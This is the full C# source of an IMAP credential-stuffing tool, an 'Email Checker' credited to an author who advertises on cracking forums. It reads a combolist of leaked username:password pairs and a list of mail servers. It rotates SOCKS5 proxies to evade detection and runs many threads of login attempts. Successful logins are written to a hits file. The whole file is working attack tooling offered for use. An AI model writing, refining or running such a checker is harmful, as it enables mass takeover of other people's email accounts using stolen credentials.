using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Chilkat;
using Console = Colorful.Console;
using Task = System.Threading.Tasks.Task;

namespace EmailChecker
{
    class Program
    {
        private static List<string> proxies;
        private static List<string> targets;
        private static ConcurrentQueue<string> combos;
        private static Random rng;

        private static bool useSsl;

        
        private static int checks = 0;
        private static int hits = 0;
        private static int miss = 0;
        private static int failed = 0;

        static async Task LoadProxies()
        {
            Console.WriteLine($"Loading proxies...", Color.Yellow);
            string proxiesPath = Path.Combine(Environment.CurrentDirectory, "proxies.txt");

            if (!File.Exists(proxiesPath))
            {
                Console.WriteLine($"No proxies loaded, running in proxyless mode!", Color.Orange);
                return;
            }

            proxies = (await File.ReadAllLinesAsync(proxiesPath)).ToList();

            Console.WriteLine($"Loaded successfully {proxies.Count} proxies!", Color.Green);
        }

        static async Task LoadTarget()
        {
            Console.WriteLine($"Loading targets...", Color.Yellow);
            string targetsPath = Path.Combine(Environment.CurrentDirectory, "targets.txt");
            if (!File.Exists(targetsPath))
            {
                Console.WriteLine($"No targets.txt file found!", Color.Red);
                Console.ReadLine();
                Environment.Exit(0);
                return;
            }

            targets = (await File.ReadAllLinesAsync(targetsPath)).ToList();

            if (targets.Count == 0)
            {
                Console.WriteLine($"Targets are empty!", Color.Red);
                Console.ReadLine();
                Environment.Exit(0);
                return;
            }
            
            Console.WriteLine($"Loaded {targets.Count} targets successfully!", Color.Green);
        }

        static async Task LoadCombo()
        {
            Console.WriteLine($"Loading combolist...", Color.Yellow);
            string comboPath = Path.Combine(Environment.CurrentDirectory, "combo.txt");

            if (!File.Exists(comboPath))
            {
                Console.WriteLine($"Failed to find the combo.txt file!", Color.Red);
                Console.ReadLine();
                Environment.Exit(0);
                return;
            }

            combos = new ConcurrentQueue<string>(await File.ReadAllLinesAsync(comboPath));

            if (combos.Count == 0)
            {
                Console.WriteLine($"Combolist is empty!", Color.Red);
                Console.ReadLine();
                Environment.Exit(0);
                return;
            }

            Console.WriteLine($"Loaded successfully {combos.Count} combo lines!", Color.Green);
        }

        static Imap GetImap()
        {
            Imap imap = new Imap();
            imap.Ssl = useSsl;

            if (proxies != null && proxies.Count > 0)
            {
                string proxyLine = proxies[rng.Next(0, proxies.Count - 1)];
                string[] split = proxyLine.Split(":");

                imap.SocksHostname = split[0];
                imap.SocksVersion = 5;
                imap.SocksPort = int.Parse(split[1]);

                if (split.Length == 4)
                {
                    imap.SocksUsername = split[2];
                    imap.SocksPassword = split[3];
                }
            }

            return imap;
        }

        static async Task<bool?> Check(string username, string password, string target)
        {
            try
            {
                string[] split = target.Split(":");
                Imap imap = GetImap();
                imap.Port = int.Parse(split[1]);

                bool res = imap.Connect(split[0]);
                if (!res)
                    return null;

                return imap.Login(username, password);
            }
            catch (Exception)
            {
                return null;
            }
        }

        static async Task WorkerThread()
        {
            while (combos.TryDequeue(out var line))
            {
                string[] split = line.Split(":");
                if (split.Length != 2)
                    continue;

                foreach (var target in targets)
                {
                    var res = await Check(split[0], split[1], target);
                    Interlocked.Increment(ref checks);
                    if (!res.HasValue)
                    {
                        Console.WriteLine($"[FAIL] {line} - {target}", Color.Red);
                        Interlocked.Increment(ref failed);
                        continue;
                    }
                    else if(res.Value)
                    {
                        Console.WriteLine($"[HIT] {line} - {target}", Color.Green);
                        string hitsPath = Path.Combine(Environment.CurrentDirectory, "hits.txt");
                        await File.AppendAllLinesAsync(hitsPath, new string[] {line});
                        Interlocked.Increment(ref hits);
                        continue;
                    }
                    else
                    {
                        Console.WriteLine($"[MISS] {line} - {target}", Color.Red);
                        Interlocked.Increment(ref miss);
                        continue;
                    }
                }
            }
        }

        static async Task MainAsync(string[] args)
        {
            Console.WriteLine(
                $"Email Checker - By Aesir - Telegram: @sickaesir | Nulled: @sickaesir | Cracked: @sickaesir",
                Color.Cyan);
            rng = new Random((int) DateTime.Now.Ticks);
            await LoadProxies();
            await LoadCombo();
            await LoadTarget();

            int threads = 0;
            while (true)
            {
                Console.Write("Thread Amount: ", Color.Yellow);
                if (!int.TryParse(Console.ReadLine(), out threads))
                    continue;

                break;
            }
            
            Console.Write("Ssl [yes/no]: ");
            if (Console.ReadLine().ToLower() == "yes")
                useSsl = true;
            else
                useSsl = false;

            ThreadPool.SetMinThreads(threads, threads);
            ThreadPool.SetMaxThreads(threads, threads);

            List<Task> tasks = new List<Task>();
            for(int i = 0; i < threads; i++)
                tasks.Add(Task.Run(WorkerThread));

            while (tasks.Any(c => !c.IsCompleted))
            {
                Console.Title =
                    $"Email Checker | By Aesir | CPM: {checks * 60} | Hits: {hits} | Miss: {miss} | Failed: {failed}";

                checks = 0;
                Thread.Sleep(1000);
            }

        }

        static void Main(string[] args)
        {
            Task.Run(async () => await MainAsync(args)).Wait();
        }
    }
}